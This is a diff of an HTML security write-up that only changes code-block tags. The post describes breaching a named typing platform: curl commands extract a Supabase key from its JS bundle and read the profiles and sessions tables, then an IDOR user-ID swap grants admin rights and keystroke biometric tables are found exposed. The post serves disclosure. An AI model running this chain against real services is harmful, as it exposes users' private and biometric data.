@@ -32,7 +32,7 @@
 <h2 id="step1"><a href="#step1">#</a> Step 1: Read the Bundle</h2>
 <p>I was interested in signing up for the platform, but it required an early access code. I typed in a bogus code and noticed zero network requests. Verification was client-side only. I checked the network tab, saw a 1.2MB JS bundle, and grepped it for the code. Instead, I found Supabase.</p>
 
-<pre><code>curl -sL "https://codetyper.in/assets/index-[HASH].js" -o bundle.js
+<pre data-lang="bash"><code>curl -sL "https://codetyper.in/assets/index-[HASH].js" -o bundle.js
 wc -c bundle.js
 # ~1.2 MB in size
 
@@ -64,11 +64,11 @@ grep -oP 'U\.from\("[^"]+"\)' bundle.js | sort -u
 <p>With the anon key, I queried tables that should have required authentication.</p>
 
 <h3>Profiles Table</h3>
-<pre><code>curl -sL "https://saqel.../rest/v1/profiles?select=*" \
+<pre data-lang="bash"><code>curl -sL "https://saqel.../rest/v1/profiles?select=*" \
   -H "apikey: sb_publishable_7uDF..."</code></pre>
 
 <p><strong>Output (truncated):</strong></p>
-<pre><code>[
+<pre data-lang="json"><code>[
   {"id":"d.3c8cb9-...","username":"iamdark...","profile_public":true},
   {"id":"c6e.7863-...","username":"ragecod...","profile_public":true},
   {"id":"1.9f3e9e-...","username":"m.as....","profile_public":false},
@@ -78,11 +78,11 @@ grep -oP 'U\.from\("[^"]+"\)' bundle.js | sort -u
 <p><strong>Result:</strong> All 53 user profiles returned, including users with <code>profile_public=false</code>.</p>
 
 <h3>Sessions Table</h3>
-<pre><code>curl -sL "https://saqel.../rest/v1/sessions?select=*&limit=2" \
+<pre data-lang="bash"><code>curl -sL "https://saqel.../rest/v1/sessions?select=*&limit=2" \
   -H "apikey: sb_publishable_7uDF..."</code></pre>
 
 <p><strong>Output:</strong></p>
-<pre><code>[
+<pre data-lang="json"><code>[
   {"id":"ff5eaf89-...","user_id":"bef5f...","gross_wpm":158.0,
    "accuracy":13.8,"deft_score":8.0,"duration_ms":45134},
   ...
@@ -95,17 +95,17 @@ grep -oP 'U\.from\("[^"]+"\)' bundle.js | sort -u
 <h2 id="step3"><a href="#step3">#</a> Step 3: Identify an Admin</h2>
 <p>The <code>admins</code> table itself had RLS enabled, but the leaked <code>profiles</code> data gave enough metadata to infer admin identities based on activity patterns and account age. From the profile dump, I extracted a high-confidence admin user ID.</p>
 
-<pre><code>Admin user ID: f1f55801-...</code></pre>
+<pre data-lang="bash"><code>Admin user ID: f1f55801-...</code></pre>
 
 <p>My own test account (now deleted):</p>
-<pre><code>Attacker user ID: ed1a1746-...</code></pre>
+<pre data-lang="bash"><code>Attacker user ID: ed1a1746-...</code></pre>
 
 <hr>
 
 <h2 id="step4"><a href="#step4">#</a> Step 4: IDOR, the path to becoming an admin</h2>
 <p>The app checks admin privileges client-side like this:</p>
 
-<pre><code>U.from("admins").select("*").eq("user_id", r.user.id).maybeSingle()</code></pre>
+<pre data-lang="bash"><code>U.from("admins").select("*").eq("user_id", r.user.id).maybeSingle()</code></pre>
 
 <p>It queries the <code>admins</code> table using the user ID from the Supabase session object. The problem: <strong>the app trusts the client-supplied user ID without server-side validation.</strong></p>
 
@@ -114,7 +114,7 @@ grep -oP 'U\.from\("[^"]+"\)' bundle.js | sort -u
 <li>Log in as a normal user (attacker_test) and obtain a valid session.</li>
 <li>Intercept the authenticated request to <code>/admin</code> using Burp Suite Community Edition.</li>
 <li>In the request context, the app builds the query using <code>r.user.id</code>. By substituting my user ID (<code>ed1a1746-...</code>) with the admin's user ID (<code>f1f55801-...</code>), the query becomes:
-<pre><code>U.from("admins").select("*").eq("user_id", "f1f55801-...").maybeSingle()</code></pre>
+<pre data-lang="bash"><code>U.from("admins").select("*").eq("user_id", "f1f55801-...").maybeSingle()</code></pre>
 </li>
 <li>The DB returns the admin's role record (<code>super</code>).</li>
 <li>The app sets <code>isSuper = true</code>.</li>
@@ -130,7 +130,7 @@ grep -oP 'U\.from\("[^"]+"\)' bundle.js | sort -u
 <h2 id="step5"><a href="#step5">#</a> Step 5: Biometric Data Exposure</h2>
 <p>The bundle referenced two sensitive tables:</p>
 
-<pre><code>// keystroke_events
+<pre data-lang="bash"><code>// keystroke_events
 .select("expected_key, key, is_error, time_since_last_ms, session_id")
 .insert(m.slice(w, w+500))  // batches of 500
 
@@ -156,7 +156,7 @@ grep -oP 'U\.from\("[^"]+"\)' bundle.js | sort -u
 <hr>
 
 <h2 id="chain"><a href="#chain">#</a> The Full Chain</h2>
-<pre><code>1. curl the JS bundle          → URL, key, table names
+<pre data-lang="bash"><code>1. curl the JS bundle          → URL, key, table names
 2. curl profiles table         → 53 user records + 1 admin ID
 3. Register account            → valid JWT session
 4. Intercept /admin request    → swap user_id for admin_id
